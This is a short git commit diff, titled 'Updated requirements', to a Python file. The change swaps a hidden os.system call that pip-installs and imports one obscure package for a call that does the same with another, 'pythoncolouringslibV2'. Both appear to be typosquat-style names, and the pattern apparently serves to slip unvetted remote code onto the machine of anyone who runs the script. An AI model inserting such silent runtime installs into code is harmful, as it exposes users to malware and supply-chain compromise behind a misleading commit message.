b17e1ed07f1ecf5d30ee2eee8203eb516e62edd4
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-05-03 00:30:51 +0200

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite3pkgV2")
-import pysqlite3pkgV2
+os.system("pip install pythoncolouringslibV2")
+import pythoncolouringslibV2
 from optparse import Option
 import requests
 import threading
